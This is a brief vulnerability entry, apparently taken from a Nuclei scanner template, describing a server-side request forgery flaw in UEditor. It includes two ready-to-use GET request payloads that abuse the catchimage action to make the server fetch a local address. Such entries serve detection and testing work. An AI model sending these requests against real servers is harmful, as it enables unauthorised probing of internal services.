# Vulnerability: UEditor - Server Side Request Forgery
**Classification:** CWE-99,CWE-918
**Source:** Nuclei Template (`ueditor-ssrf.yaml`)

## Description
UEditor contains an Server Side Request Forgery vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png
GET {{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png
```

